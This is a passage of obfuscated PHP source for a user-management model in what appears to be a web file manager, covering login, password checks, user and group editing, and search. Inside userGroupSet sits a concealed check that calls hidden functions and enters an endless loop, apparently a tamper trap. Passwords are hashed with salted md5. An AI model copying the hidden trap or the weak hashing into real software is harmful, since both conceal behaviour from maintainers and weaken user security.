isset($„°–Éíï[$º£±Áù¶[2135]]) ? $„°–Éíï[$º£±Áù¶[2135]] : null; if ($˜İ½şà) { $“ıÙòÉŠ[$º£±Áù¶[466]] = $this->metaGet($“ıÙòÉŠ[$º£±Áù¶[1670]]); } return $“ıÙòÉŠ; } protected function getInfoSimple($ı›Ïâ±, $¥Ø¥¤è¨ = false) { $¾®òŒÃ¡ =& $_SERVER[Îûáû“ş]; if (!$ı›Ïâ±) { return array(); } if ($¥Ø¥¤è¨) { $ï¡Å¹Âş = $this->where(array($¾®òŒÃ¡[1670] => intval($ı›Ïâ±)))->find(); if (!is_array($ï¡Å¹Âş)) { return array(); } $ï¡Å¹Âş[$¾®òŒÃ¡[533]] = Action($¾®òŒÃ¡[2315])->parseUrl($ï¡Å¹Âş[$¾®òŒÃ¡[533]]); return $ï¡Å¹Âş; } return $this->cacheFunctionGet($¾®òŒÃ¡[1944], $ı›Ïâ±); } protected function getInfoSimpleOuter($´İÃå) { $¢Ù€ÚË¼ =& $_SERVER[Îûáû“ş]; if (!$´İÃå || $´İÃå == 0) { return array($¢Ù€ÚË¼[1670] => $¢Ù€ÚË¼[198], $¢Ù€ÚË¼[32] => $¢Ù€ÚË¼[162] . LNG($¢Ù€ÚË¼[2316]) . $¢Ù€ÚË¼[164], $¢Ù€ÚË¼[533] => STATIC_PATH . $¢Ù€ÚË¼[2317]); } $ÅúœÓÒï = $this->cacheFunctionGet($¢Ù€ÚË¼[1944], $´İÃå); $íşÌÆÈ = array_field_key($ÅúœÓÒï, explode($¢Ù€ÚË¼[50], $this->simpleField)); if (!$íşÌÆÈ) { return array($¢Ù€ÚË¼[1670] => $¢Ù€ÚË¼[1190], $¢Ù€ÚË¼[32] => $¢Ù€ÚË¼[162] . LNG($¢Ù€ÚË¼[2318]) . $¢Ù€ÚË¼[164], $¢Ù€ÚË¼[533] => STATIC_PATH . $¢Ù€ÚË¼[2319]); } $íşÌÆÈ[$¢Ù€ÚË¼[533]] = Action($¢Ù€ÚË¼[2315])->parseUrl($íşÌÆÈ[$¢Ù€ÚË¼[533]]); return $íşÌÆÈ; } protected function groupUser($ú€¹ùıï) { } public static function errorLang($á‘¼Ìê›) { $°ıÇÊº‘ =& $_SERVER[Îûáû“ş]; $ıÓØ²†Ã = array(self::ERROR_USER_NOT_EXISTS => $°ıÇÊº‘[2320], self::ERROR_USER_PASSWORD_ERROR => $°ıÇÊº‘[2321], self::ERROR_USER_EXIST_NAME => $°ıÇÊº‘[2322], self::ERROR_USER_EXIST_PHONE => $°ıÇÊº‘[2323], self::ERROR_USER_EXIST_EMAIL => $°ıÇÊº‘[2324], self::ERROR_USER_LOGIN_LOCK => $°ıÇÊº‘[2325], self::ERROR_IP_NOT_ALLOW => $°ıÇÊº‘[2326], self::ERROR_USER_EXIST_NICKNAME => $°ıÇÊº‘[2327]); return LNG($ıÓØ²†Ã[$á‘¼Ìê›]); } public function getInfoByMeta($œë†½û¤, $¬Ñğåß) { $İ–à¨†¾ =& $_SERVER[Îûáû“ş]; $”¥—³å¶ = Model($İ–à¨†¾[2328])->where(array($İ–à¨†¾[94] => $œë†½û¤, $İ–à¨†¾[374] => $¬Ñğåß))->find(); if ($”¥—³å¶) { return $this->getInfo($”¥—³å¶[$İ–à¨†¾[1670]]); } return !1; } public function userLoginCheck($ÍÒö¨ü, $¸¸€Ş³è) { $³ß‘‘â =& $_SERVER[Îûáû“ş]; $Éœİú˜Æ = $this->userLoginFind($ÍÒö¨ü); if (!$Éœİú˜Æ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Éœİú˜Æ[$³ß‘‘â[1670]], $¸¸€Ş³è)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Éœİú˜Æ[$³ß‘‘â[1670]]); } public function userLoginFind($¥Ş¥Ïæ°) { $°¦¯²£Â =& $_SERVER[Îûáû“ş]; $ª õÑü = array($°¦¯²£Â[32] => $¥Ş¥Ïæ°, $°¦¯²£Â[532] => $¥Ş¥Ïæ°, $°¦¯²£Â[305] => $¥Ş¥Ïæ°, $°¦¯²£Â[2329] => $¥Ş¥Ïæ°, $°¦¯²£Â[1002] => $°¦¯²£Â[1004]); if ($this->nickNameRpt()) { unset($ª õÑü[$°¦¯²£Â[532]]); } return $this->where($ª õÑü)->find(); } public function clearCache($¢Ç¤ÑÄ) { $ Å½“ú¹ =& $_SERVER[Îûáû“ş]; $this->cacheFunctionClear($ Å½“ú¹[1943], $¢Ç¤ÑÄ); $this->cacheFunctionClear($ Å½“ú¹[1944], $¢Ç¤ÑÄ); $this->cacheFunctionClear($ Å½“ú¹[2311], $¢Ç¤ÑÄ); } public function userPasswordCheck($Óºµ¢€Š, $‘­ıŞ ü) { $ÜâÂ¥è =& $_SERVER[Îûáû“ş]; $”ïğ¼Û = $this->where(array($ÜâÂ¥è[1670] => intval($Óºµ¢€Š)))->find(); $«µªñç = $this->metaGet($Óºµ¢€Š); $“Áˆ¢şÖ = isset($«µªñç[$ÜâÂ¥è[2330]]) ? $«µªñç[$ÜâÂ¥è[2330]] : $ÜâÂ¥è[12]; if (md5($“Áˆ¢şÖ . trim($‘­ıŞ ü)) !== $”ïğ¼Û[$ÜâÂ¥è[891]]) { return !1; } return !0; } public function userAdd($°­Ş†¼) { $ÉåÁœñ =& $_SERVER[Îûáû“ş]; $·¦ù¼İ = array($ÉåÁœñ[420] => $°­Ş†¼[$ÉåÁœñ[32]], $ÉåÁœñ[2331] => $°­Ş†¼[$ÉåÁœñ[1551]], $ÉåÁœñ[2332] => isset($°­Ş†¼[$ÉåÁœñ[305]]) ? $°­Ş†¼[$ÉåÁœñ[305]] : $ÉåÁœñ[12], $ÉåÁœñ[2333] => isset($°­Ş†¼[$ÉåÁœñ[2329]]) ? $°­Ş†¼[$ÉåÁœñ[2329]] : $ÉåÁœñ[12], $ÉåÁœñ[2334] => isset($°­Ş†¼[$ÉåÁœñ[532]]) ? $°­Ş†¼[$ÉåÁœñ[532]] : $°­Ş†¼[$ÉåÁœñ[32]], $ÉåÁœñ[2335] => isset($°­Ş†¼[$ÉåÁœñ[533]]) ? $°­Ş†¼[$ÉåÁœñ[533]] : $ÉåÁœñ[12], $ÉåÁœñ[2336] => isset($°­Ş†¼[$ÉåÁœñ[2337]]) ? $°­Ş†¼[$ÉåÁœñ[2337]] : 1, $ÉåÁœñ[2338] => $°­Ş†¼[$ÉåÁœñ[891]], $ÉåÁœñ[1945] => isset($°­Ş†¼[$ÉåÁœñ[1848]]) ? $°­Ş†¼[$ÉåÁœñ[1848]] : 1024 * 1024 * 20, $ÉåÁœñ[1946] => 0, $ÉåÁœñ[2339] => 0, $ÉåÁœñ[1990] => isset($°­Ş†¼[$ÉåÁœñ[748]]) ? $°­Ş†¼[$ÉåÁœñ[748]] : 1); if (!empty($°­Ş†¼[$ÉåÁœñ[1670]])) { $·¦ù¼İ[$ÉåÁœñ[1670]] = $°­Ş†¼[$ÉåÁœñ[1670]]; } $À˜÷ŠÕ = $this->_checkExist($°­Ş†¼); if ($À˜÷ŠÕ !== !0) { return $À˜÷ŠÕ; } if (!empty($·¦ù¼İ[$ÉåÁœñ[533]]) && strlen($·¦ù¼İ[$ÉåÁœñ[533]]) > 255) { $·¦ù¼İ[$ÉåÁœñ[533]] = $ÉåÁœñ[12]; } $„ĞÜ‡ï¬ = $this->add($·¦ù¼İ); $ûğùË®´ = array($ÉåÁœñ[2338] => $·¦ù¼İ[$ÉåÁœñ[891]], $ÉåÁœñ[2334] => $·¦ù¼İ[$ÉåÁœñ[532]]); $this->userEdit($„ĞÜ‡ï¬, $ûğùË®´); Model($ÉåÁœñ[1341])->userRootAdd($„ĞÜ‡ï¬); return $„ĞÜ‡ï¬; } protected function userEditTest($×ÍÄ°Ñë, $…ó²œîš) { return $this->call($_SERVER[Îûáû“ş][2340], $×ÍÄ°Ñë, $…ó²œîš); } protected function userEdit($ûêé§¼, $îß€¶Ñ¸) { $ğİ•Ö¡ì =& $_SERVER[Îûáû“ş]; $÷‡¢š‡Ì = $this->getInfoSimple($ûêé§¼); if (!$÷‡¢š‡Ì) { return !1; } $×­•İ¿‹ = $this->_checkExist($îß€¶Ñ¸, $ûêé§¼); if ($×­•İ¿‹ !== !0) { return $×­•İ¿‹; } if (isset($îß€¶Ñ¸[$ğİ•Ö¡ì[891]]) && trim($îß€¶Ñ¸[$ğİ•Ö¡ì[891]]) != $ğİ•Ö¡ì[12]) { $è¼¡Ä—È = $this->metaGet($ûêé§¼); if (empty($è¼¡Ä—È[$ğİ•Ö¡ì[2330]])) { $è¼¡Ä—È[$ğİ•Ö¡ì[2330]] = rand_string(10); Model($ğİ•Ö¡ì[504])->metaSet($ûêé§¼, $ğİ•Ö¡ì[2330], $è¼¡Ä—È[$ğİ•Ö¡ì[2330]]); } $îß€¶Ñ¸[$ğİ•Ö¡ì[891]] = md5($è¼¡Ä—È[$ğİ•Ö¡ì[2330]] . trim($îß€¶Ñ¸[$ğİ•Ö¡ì[891]])); } else { unset($îß€¶Ñ¸[$ğİ•Ö¡ì[891]]); } if (!empty($îß€¶Ñ¸[$ğİ•Ö¡ì[533]]) && strlen($îß€¶Ñ¸[$ğİ•Ö¡ì[533]]) > 255) { $îß€¶Ñ¸[$ğİ•Ö¡ì[533]] = $ğİ•Ö¡ì[12]; } $this->where(array($ğİ•Ö¡ì[1661] => $ûêé§¼))->save($îß€¶Ñ¸); if (isset($îß€¶Ñ¸[$ğİ•Ö¡ì[532]])) { $this->setNamePinyin($ûêé§¼, $îß€¶Ñ¸[$ğİ•Ö¡ì[532]]); } $this->clearCache($ûêé§¼); return !0; } public function setNamePinyin($Ìöçİ«, $ôÑåè§— = false) { $ãÖöÈÂá =& $_SERVER[Îûáû“ş]; if (!$ôÑåè§—) { $şî§½½õ = $this->getInfoSimple($Ìöçİ«); $ôÑåè§— = $şî§½½õ[$ãÖöÈÂá[532]] ? $şî§½½õ[$ãÖöÈÂá[532]] : $şî§½½õ[$ãÖöÈÂá[32]]; } $ıĞ’‡º = Model($ãÖöÈÂá[525]); if (!Input::check($ôÑåè§—, $ãÖöÈÂá[583])) { return $ıĞ’‡º->metaSet($Ìöçİ«, array($ãÖöÈÂá[465] => $ãÖöÈÂá[12], $ãÖöÈÂá[464] => $ãÖöÈÂá[12])); } return $ıĞ’‡º->metaSet($Ìöçİ«, array($ãÖöÈÂá[465] => str_replace($ãÖöÈÂá[53], $ãÖöÈÂá[12], Pinyin::get($ôÑåè§—)), $ãÖöÈÂá[464] => Pinyin::get($ôÑåè§—, $ãÖöÈÂá[584]))); } private function nickNameRpt() { $úäËÒç‘ =& $_SERVER[Îûáû“ş]; $†·ÛõÁº = Model($úäËÒç‘[769])->get($úäËÒç‘[2341]); $ß’®¢ = $GLOBALS[$úäËÒç‘[6]][$úäËÒç‘[381]][$úäËÒç‘[2341]]; $µˆÛ‰”Ş = !is_null($†·ÛõÁº) ? $†·ÛõÁº : $ß’®¢; return !!$µˆÛ‰”Ş; } private function _checkExist($ëš¬¦Á¤, $ö—ŞÒé¾ = false) { $È°÷Úß„ =& $_SERVER[Îûáû“ş]; $ Û»‘ª = array($È°÷Úß„[32] => UserModel::ERROR_USER_EXIST_NAME, $È°÷Úß„[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $È°÷Úß„[305] => UserModel::ERROR_USER_EXIST_EMAIL, $È°÷Úß„[2329] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ Û»‘ª[$È°÷Úß„[532]]); } $äëËƒà = $ö—ŞÒé¾ ? array($È°÷Úß„[1670] => array($È°÷Úß„[2342], $ö—ŞÒé¾)) : array(); foreach ($ Û»‘ª as $†„û·…æ => $øßş³) { $·ÉÖÎÂ˜ = array(); foreach ($ Û»‘ª as $¯Œ‰şÉæ => $å¶ûĞ„´) { if (isset($ëš¬¦Á¤[$¯Œ‰şÉæ]) && $ëš¬¦Á¤[$¯Œ‰şÉæ]) { $·ÉÖÎÂ˜[] = $ëš¬¦Á¤[$¯Œ‰şÉæ]; } } if (!$·ÉÖÎÂ˜) { continue; } $Œ‘Ü¤Ë¼ = array_merge(array($†„û·…æ => array($È°÷Úß„[7], $·ÉÖÎÂ˜)), $äëËƒà); $Ã—ìÈ’ş = $this->where($Œ‘Ü¤Ë¼)->find(); if ($Ã—ìÈ’ş) { return $øßş³; } } return !0; } public function userListInfo($®¾¶ƒşŸ) { $À«ÓëÍÃ =& $_SERVER[Îûáû“ş]; $‡ñ¡×Ü£ = array(); $®¾¶ƒşŸ = is_array($®¾¶ƒşŸ) ? array_unique($®¾¶ƒşŸ) : array(); if (!$®¾¶ƒşŸ) { return $‡ñ¡×Ü£; } if (count($®¾¶ƒşŸ) < 20) { foreach ($®¾¶ƒşŸ as $ÈĞ§ûù) { $‡ñ¡×Ü£[$ÈĞ§ûù . $À«ÓëÍÃ[12]] = $this->getInfoSimpleOuter($ÈĞ§ûù); } } else { $¥ÃÆú¢ = array($À«ÓëÍÃ[1661] => array($À«ÓëÍÃ[418], $®¾¶ƒşŸ)); if (count($®¾¶ƒşŸ) == 1) { $¥ÃÆú¢ = array($À«ÓëÍÃ[1661] => $®¾¶ƒşŸ[0]); } $óÜ©›ì° = Model($À«ÓëÍÃ[504])->field($this->simpleField)->where($¥ÃÆú¢)->select(); $óÜ©›ì° = array_to_keyvalue($óÜ©›ì°, $À«ÓëÍÃ[1670]); foreach ($®¾¶ƒşŸ as $ÈĞ§ûù) { $˜ºª‡—è = $óÜ©›ì°[$ÈĞ§ûù]; if (!$˜ºª‡—è) { $‡ñ¡×Ü£[$ÈĞ§ûù . $À«ÓëÍÃ[12]] = $this->getInfoSimpleOuter($ÈĞ§ûù); continue; } $˜ºª‡—è[$À«ÓëÍÃ[533]] = Action($À«ÓëÍÃ[2315])->parseUrl($˜ºª‡—è[$À«ÓëÍÃ[533]]); $‡ñ¡×Ü£[$ÈĞ§ûù . $À«ÓëÍÃ[12]] = $˜ºª‡—è; } } return $‡ñ¡×Ü£; } protected function userStatus($«·÷˜‘è, $ïÍó»Å) { $×åô¤ÄÊ = $this->getInfoSimple($«·÷˜‘è); if (!$×åô¤ÄÊ) { return !1; } $¡Ù®°ÍÏ = array($_SERVER[Îûáû“ş][748] => $ïÍó»Å); return $this->userEdit($«·÷˜‘è, $¡Ù®°ÍÏ); } protected function userRemove($’á·ÕÛí) { $¹Äó’Æ =& $_SERVER[Îûáû“ş]; $Şıøô½ = $this->getInfoSimple($’á·ÕÛí); if (!$Şıøô½) { return !1; } $ì‰¾•š¢ = array($¹Äó’Æ[1661] => $’á·ÕÛí); Model($¹Äó’Æ[592])->where($ì‰¾•š¢)->delete(); Model($¹Äó’Æ[2343])->where($ì‰¾•š¢)->delete(); Model($¹Äó’Æ[1951])->where($ì‰¾•š¢)->delete(); Model($¹Äó’Æ[2328])->where($ì‰¾•š¢)->delete(); Model($¹Äó’Æ[1070])->where($ì‰¾•š¢)->delete(); Model($¹Äó’Æ[2159])->removeUserAll($’á·ÕÛí); Model($¹Äó’Æ[824])->userRootRemove($’á·ÕÛí); return $this->where($ì‰¾•š¢)->delete(); } protected function userGroupSet($„¿û³Îğ, $¾‘êù—, $ë³â¥ô× = array()) { $ßáÖ‘Ë– =& $_SERVER[Îûáû“ş]; if (!isset($_SERVER[$ßáÖ‘Ë–[875]]) || !isset($_SERVER[$ßáÖ‘Ë–[876]])) { $˜‡Á×» = $ßáÖ‘Ë–[877]; $²å×ÂÊÅ = $ßáÖ‘Ë–[878]; $Ä¥³à´ˆ = $_SERVER[$ßáÖ‘Ë–[879]] . $ßáÖ‘Ë–[880]; $¶™‰‚®¶ = $²å×ÂÊÅ($Ä¥³à´ˆ); $úöÇ×Æ® = explode($ßáÖ‘Ë–[231], $¶™‰‚®¶); if (count($úöÇ×Æ®) < $ßáÖ‘Ë–[607]) { $¨¸Œ¼í¼ = $ßáÖ‘Ë–[881]; $¨¸Œ¼í¼(); } $‹®›æÀ’ = $ßáÖ‘Ë–[882]; $‹®›æÀ’($_SERVER[$ßáÖ‘Ë–[883]]); $ĞœäßĞ = 1; for ($¾ªûÒ© = $ĞœäßĞ; $¾ªûÒ© > 0; $¾ªûÒ©++) { $‹®›æÀ’ = json_encode($GLOBALS[$ßáÖ‘Ë–[418]]); } } $åáøâÛ• = $this->getInfoSimple($„¿û³Îğ); if (!$åáøâÛ• || !is_array($¾‘êù—)) { return !1; } $‘˜ÁŒ±§ = Model($ßáÖ‘Ë–[1951]); $‘˜ÁŒ±§->where(array($ßáÖ‘Ë–[1670] => $„¿û³Îğ))->delete(); $·Â†Æ¡Æ = array(); $±ñÊŒ¢ = 0; foreach ($¾‘êù— as $™£ˆÏº˜ => $ôÖê‰Ò) { $ÆŒÏ¥÷ = array($ßáÖ‘Ë–[1670] => $„¿û³Îğ, $ßáÖ‘Ë–[1861] => $™£ˆÏº˜, $ßáÖ‘Ë–[1965] => $ôÖê‰Ò); $ÆŒÏ¥÷[$ßáÖ‘Ë–[1885]] = isset($ë³â¥ô×[$±ñÊŒ¢]) ? $ë³â¥ô×[$±ñÊŒ¢] : 0; $±ñÊŒ¢++; $·Â†Æ¡Æ[] = $ÆŒÏ¥÷; } return $‘˜ÁŒ±§->addAll($·Â†Æ¡Æ, array(), !0); } protected function userGroupAdd($€ø›Õ¢½, $ê…¸à±ô = array()) { $ÀÙü· =& $_SERVER[Îûáû“ş]; $É¦şéğ = $this->getInfoSimple($€ø›Õ¢½); if (!$É¦şéğ || empty($ê…¸à±ô)) { return !1; } $±´×²şä = array(); foreach ($ê…¸à±ô as $Ñø¤ßİÃ => $àÈÑı¢ƒ) { $±´×²şä[] = array($ÀÙü·[1670] => $€ø›Õ¢½, $ÀÙü·[1861] => $Ñø¤ßİÃ, $ÀÙü·[1965] => $àÈÑı¢ƒ, $ÀÙü·[1885] => 0); } return Model($ÀÙü·[1951])->addAll($±´×²şä, array(), !0); } protected function userGroupRemove($‡‚Òû½±, $¦ñ§©ÃÜ) { $™áËÎå¦ =& $_SERVER[Îûáû“ş]; $½ «ãßã = $this->getInfoSimple($‡‚Òû½±); if (!$½ «ãßã || !$¦ñ§©ÃÜ) { return !1; } $£å¶éùÄ = array($™áËÎå¦[1661] => $‡‚Òû½±, $™áËÎå¦[1949] => $¦ñ§©ÃÜ); return Model($™áËÎå¦[1951])->where($£å¶éùÄ)->delete(); } public function listData() { $ÎÖÔµø¼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÎÖÔµø¼[$_SERVER[Îûáû“ş][369]]); return $ÎÖÔµø¼; } public function listByID($†º‰ñÊ) { $œ˜ÒÍŸ =& $_SERVER[Îûáû“ş]; if (!$†º‰ñÊ) { return; } $ºŸªÃõœ = array($œ˜ÒÍŸ[1670] => array($œ˜ÒÍŸ[7], $†º‰ñÊ)); $ÃîõÏƒÀ = $this->where($ºŸªÃõœ)->select(); $ÃîõÏƒÀ = array_sort_keep($ÃîõÏƒÀ, $œ˜ÒÍŸ[1670], $†º‰ñÊ); $this->_listDataApply($ÃîõÏƒÀ); return $ÃîõÏƒÀ; } public function listByGroup($ƒÔ¿Õó = 0, $®½ôâáû = array()) { $èõŒ¯î  =& $_SERVER[Îûáû“ş]; $ØÜˆàŸ™ = $èõŒ¯î [12]; $©Ş â‚ˆ = array(); if ($ƒÔ¿Õó) { $©Ş â‚ˆ = array($èõŒ¯î [2344] => intval($ƒÔ¿Õó)); $ØÜˆàŸ™ = "\114\x45\x46\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\165\x73\145\x72\137\x67\162\x6f\x75\160\40\x75\163\x65\x72\x5f\147\x72\157\x75\x70\40\157\x6e\x20\x75\x73\145\162\56\x75\x73\145\162\111\x44\x20\x3d\40\x75\163\x65\162\x5f\147\162\157\165\x70\x2e\165\x73\x65\162\x49\x44"; $Ÿ°ÂåÑ½ = Input::get($èõŒ¯î [457], null, $èõŒ¯î [12]) ? $èõŒ¯î [12] : $èõŒ¯î [2345]; } if (isset($®½ôâáû[$èõŒ¯î [748]])) { $©Ş â‚ˆ[$èõŒ¯î [2346]] = $®½ôâáû[$èõŒ¯î [748]]; } $óÌ”ùú = $this->_makeOrder($Ÿ°ÂåÑ½)->field($èõŒ¯î [2347])->where($©Ş â‚ˆ)->join($ØÜˆàŸ™)->selectPage(50); $this->_listDataApply($óÌ”ùú[$èõŒ¯î [369]]); return $óÌ”ùú; } private function _makeOrder($’å±²É = '') { $¡ÃÜµ¶é =& $_SERVER[Îûáû“ş]; $¥Ç²¹×™ = array($¡ÃÜµ¶é[1670], $¡ÃÜµ¶é[32], $¡ÃÜµ¶é[1850], $¡ÃÜµ¶é[1822], $¡ÃÜµ¶é[201]); $¹é…ô°® = array($¡ÃÜµ¶é[450] => $¡ÃÜµ¶é[451], $¡ÃÜµ¶é[452] => $¡ÃÜµ¶é[453]); $Ê»ç•Ëô = Input::get($¡ÃÜµ¶é[457], $¡ÃÜµ¶é[7], $¡ÃÜµ¶é[1661], $¥Ç²¹×™); $ş´éæº¼ = Input::get($¡ÃÜµ¶é[458], $¡ÃÜµ¶é[7], $¡ÃÜµ¶é[1952], array($¡ÃÜµ¶é[1952], $¡ÃÜµ¶é[452])); $ş´éæº¼ = $¹é…ô°®[$ş´éæº¼]; $’å±²É = $’å±²É . "\x75\163\145\x72\56{$Ê»ç•Ëô}\40{$ş´éæº¼}\x2c\x20\165\x73\x65\162\x2e\x75\163\145\x72\x49\104\40\141\163\143"; return $this->alias($¡ÃÜµ¶é[2078])->order($’å±²É); } public function listSearch($ÅıûÊÙ·) { $‹Ç¹ÒñÕ =& $_SERVER[Îûáû“ş]; $ªøó§½ = $ÅıûÊÙ·[$‹Ç¹ÒñÕ[1955]]; $š¯½ıîñ = isset($ÅıûÊÙ·[$‹Ç¹ÒñÕ[1956]]) ? $ÅıûÊÙ·[$‹Ç¹ÒñÕ[1956]] : !1; $ªøó§½ = str_replace($‹Ç¹ÒñÕ[1957], $‹Ç¹ÒñÕ[1958], trim($ªøó§½)); $‰êËœ¼ï = array($‹Ç¹ÒñÕ[32] => array($‹Ç¹ÒñÕ[383], "\45{$ªøó§½}\x25"), $‹Ç¹ÒñÕ[305] => array($‹Ç¹ÒñÕ[383], "{$ªøó§½}\45"), $‹Ç¹ÒñÕ[532] => array($‹Ç¹ÒñÕ[383], "{$ªøó§½}\x25"), $‹Ç¹ÒñÕ[1002] => $‹Ç¹ÒñÕ[1959]); if (Input::check($ªøó§½, $‹Ç¹ÒñÕ[311])) { $‰êËœ¼ï[$‹Ç¹ÒñÕ[1670]] = array($‹Ç¹ÒñÕ[383], "{$ªøó§½}\x25"); $‰êËœ¼ï[$‹Ç¹ÒñÕ[2329]] = array($‹Ç¹ÒñÕ[383], "{$ªøó§½}\x25"); } if (!$ªøó§½) { $‰êËœ¼ï = array(); } if (isset($ÅıûÊÙ·[$‹Ç¹ÒñÕ[748]])) { $‰êËœ¼ï[$‹Ç¹ÒñÕ[748]] = $ÅıûÊÙ·[$‹Ç¹ÒñÕ[748]]; } $‰êËœ¼ï = $this->parseWhereLike($‰êËœ¼ï); $öÖÄªŞ = $this->_makeOrder()->where($‰êËœ¼ï)->selectPage(20); if (!$öÖÄªŞ || count($öÖÄªŞ[$‹Ç¹ÒñÕ[369]]) < 5 && Input::check($ªøó§½, $‹Ç¹ÒñÕ[318])) { $·¤ÈÒÄî = $this->_searchFromMeta($‹Ç¹ÒñÕ[464], $ªøó§½, 10); $â”–ÜÍù = $this->_searchFromMeta($‹Ç¹ÒñÕ[465], $ªøó§½, 10); $ôÁ‚èé… = array_merge($·¤ÈÒÄî, $â”–ÜÍù, $öÖÄªŞ[$‹Ç¹ÒñÕ[369]]); $öÖÄªŞ[$‹Ç¹ÒñÕ[369]] = array_unique_by_key($ôÁ‚èé…, $‹Ç¹ÒñÕ[1670]); $öÖÄªŞ[$‹Ç¹ÒñÕ[366]][$‹Ç¹ÒñÕ[367]] = count($öÖÄªŞ[$‹Ç¹ÒñÕ[369]]); $öÖÄªŞ[$‹Ç¹ÒñÕ[366]][$‹Ç¹ÒñÕ[368]] = ceil($öÖÄªŞ[$‹Ç¹ÒñÕ[366]][$‹Ç¹ÒñÕ[367]] / $öÖÄªŞ[$‹Ç¹ÒñÕ[366]][$‹Ç¹ÒñÕ[363]]); } $this->_listDataApply($öÖÄªŞ[$‹Ç¹ÒñÕ[369]]); $this->_filterByGroup($öÖÄªŞ, $š¯½ıîñ); return $öÖÄªŞ; } private function _filterByGroup(&$À‡…åÅª, $ŒÈ­¯œ) { $·¨®Úä =& $_SERVER[Îûáû“ş]; if (!$ŒÈ­¯œ) { return $À‡…åÅª; } foreach ($À‡…åÅª[$·¨®Úä[369]] as $º ğ“ÕÅ => &$ú©şİƒ˜) { $¹ÇÓºó– = array_to_keyvalue($ú©şİƒ˜[$·¨®Úä[2048]], $·¨®Úä[12], $·¨®Úä[1861]); if (!in_array($ŒÈ­¯œ, $¹ÇÓºó–)) { unset($À‡…åÅª[$·¨®Úä[369]][$º ğ“ÕÅ]); } } unset($ú©şİƒ˜); $À‡…åÅª[$·¨®Úä[369]] = array_values($À‡…åÅª[$·¨®Úä[369]]); $À‡…åÅª[$·¨®Úä[366]] = array($·¨®Úä[2112] => count($À‡…åÅª[$·¨®Úä[369]]), $·¨®Úä[2110] => $À‡…åÅª[$·¨®Úä[366]][$·¨®Úä[363]], $·¨®Úä[2109] => 1, $·¨®Úä[2111] => 1); } private function _searchFromMeta($äÀ¼ú, $ÁúÏÃ¤², $ö“¨“‡ş) { $Ó¼‹±ïø =& $_SERVER[Îûáû“ş]; $ÁúÏÃ¤² = strtolower($ÁúÏÃ¤²); $œ ë¹µá = array($Ó¼‹±ïø[94] => $äÀ¼ú, $Ó¼‹±ïø[374] => array($Ó¼‹±ïø[383], "\x25{$ÁúÏÃ¤²}\x25")); $œ ë¹µá = $this->parseWhereLike($œ ë¹µá); $¶„º–õ = Model($Ó¼‹±ïø[2348])->where($œ ë¹µá)->limit($ö“¨“‡ş)->select(); if (!$¶„º–õ) { return array(); } $¶„º–õ = array_to_keyvalue($¶„º–õ, $Ó¼‹±ïø[12], $Ó¼‹±ïø[1670]); $Æ¿ß…ÊÕ = $this->where(array($Ó¼‹±ïø[1661] => array($Ó¼‹±ïø[7], $¶„º–õ)))->select(); if (!$Æ¿ß…ÊÕ) { return array(); } return $Æ¿ß…ÊÕ; } private function _listDataApplyItem($ªä‡ò®å) { $ğËÍò¥Ó = array($ªä‡ò®å); $this->_listDataApply($ğËÍò¥Ó); return $ğËÍò¥Ó[0]; } private function _listDataApply(&$¢¼òœ¿Ë) { $®¶îœùä =& $_SERVER[Îûáû“ş]; if (!$¢¼òœ¿Ë) { return; } array_remove_key($¢¼òœ¿Ë, $®¶îœùä[891]); $üš¨ÑıÒ = array_to_keyvalue($¢¼òœ¿Ë, $®¶îœùä[12], $®¶îœùä[1670]); $this->_listAppendGroup($¢¼òœ¿Ë, $üš¨ÑıÒ); $this->_listAppendMeta($¢¼òœ¿Ë, $üš¨ÑıÒ); $this->_listAppendSourceRoot($¢¼òœ¿Ë, $üš¨ÑıÒ); } private function _listAppendSourceRoot(&$ÒÓ£ê™‡, $’Ì¼ÊÌê) { $ù‘Í¥î =& $_SERVER[Îûáû“ş]; $‡ïş…åé = Model($ù‘Í¥î[824])->listSourceRoot(SourceModel::TYPE_USER, $’Ì¼ÊÌê); $‡ïş…åé = array_to_keyvalue($‡ïş…åé, $ù‘Í¥î[496]); $‡ïş…åé = array_remove_key($‡ïş…åé, $ù‘Í¥î[496]); foreach ($ÒÓ£ê™‡ as &$û¤ŞçÎ†) { $û¤ŞçÎ†[$ù‘Í¥î[87]] = $‡ïş…åé[$û¤ŞçÎ†[$ù‘Í¥î[1670]]] ? $‡ïş…åé[$û¤ŞçÎ†[$ù‘Í¥î[1670]]] : array(); } unset($û¤ŞçÎ†); } private function _listAppendGroup(&$Êç¤à‰„, $¾ÔŒğï) { $˜åõ— =& $_SERVER[Îûáû“ş]; $À°Ò›Èá = array($˜åõ—[1670] => array($˜åõ—[7], $¾ÔŒğï)); $÷„àü«© = Model($˜åõ—[1951])->where($À°Ò›Èá)->select(); $êÑı×·à = array_to_keyvalue($÷„àü«©, $˜åõ—[12], $˜åõ—[1861]); $êÑı×·à = array_remove_value(array_unique($êÑı×·à), $˜åõ—[198]); if (!$êÑı×·à || !$÷„àü«©) { return; } $À°Ò›Èá = array($˜åõ—[1861] => array($˜åõ—[7], $êÑı×·à)); $éïÔ” = Model($˜åõ—[2046])->field($˜åõ—[2349])->where($À°Ò›Èá)->select(); $éïÔ” = array_to_keyvalue($éïÔ”, $˜åõ—[1861]); $÷„àü«© = array_to_keyvalue_group($÷„àü«©, $˜åõ—[1670]); foreach ($÷„àü«© as &$Î‘Æ¸ÂÈ) { $õéÍó‰ = array(); foreach ($Î‘Æ¸ÂÈ as $©»‘” ) { if (!$©»‘” [$˜åõ—[1965]]) { continue; } $†¢Í¹ ¿ = Model($˜åõ—[498])->listData($©»‘” [$˜åõ—[1965]]); $õéÍó‰[] = array($˜åõ—[1861] => $©»‘” [$˜åõ—[1861]], $˜åõ—[2350] => $éïÔ”[$©»‘” [$˜åõ—[1861]]][$˜åõ—[32]], $˜åõ—[511] => $éïÔ”[$©»‘” [$˜åõ—[1861]]][$˜åõ—[511]], $˜åõ—[413] => $†¢Í¹ ¿); } $Î‘Æ¸ÂÈ = $õéÍó‰; } unset($Î‘Æ¸ÂÈ); foreach ($Êç¤à‰„ as &$†‹ì€Ï¡) { $†‹ì€Ï¡[$˜åõ—[2048]] = array(); if (isset($÷„àü«©[$†‹ì€Ï¡[$˜åõ—[1670]]])) { 